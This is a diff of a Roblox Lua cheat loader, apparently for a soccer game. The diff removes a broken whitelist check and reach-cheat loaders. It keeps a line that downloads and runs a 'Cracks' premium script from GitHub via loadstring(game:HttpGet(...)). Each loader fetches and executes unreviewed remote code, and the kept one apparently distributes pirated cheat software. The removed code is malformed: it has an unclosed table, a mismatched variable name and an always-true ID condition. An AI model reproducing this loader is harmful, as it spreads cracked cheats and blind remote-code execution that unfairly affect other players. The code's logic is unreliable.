@@ -1,33 +1,3 @@
-local whilest = {
-
-"akqkqhwhqhqhw",
-
-
-if table.find(whitelist, game.Players.LocalPlayer.Name) then
-        local id = game.PlaceId
-if id == 335760407 or 13762482705 then
-game.StarterGui:SetCore("SendNotification",{
-            Title = "Loading...";
-            Text = "Loading will take some seconds...";
-            Duration = 5;
-})
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Hcuifhebedi/xufpo0jxjj--/main/Pedjidjdjdhidjm"))()
-else
-    game.Players.LocalPlayer:Kick("It's not TPS SS!")
-end
-else
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/yQazz/yQazz/main/reach"))();
-end
-
-
-game:GetService("StarterGui"):SetCore("SendNotification",{
-    Title = "yQazz Premium",
-    Text = "Loading Gui",
-    Icon = "rbxassetid://57254792";
-Duration = 5;
-})
-
-
 loadstring(game:HttpGet("https://raw.githubusercontent.com/TheHanki/Cracks/main/yBloodz/Premium"))()
 
 local old;
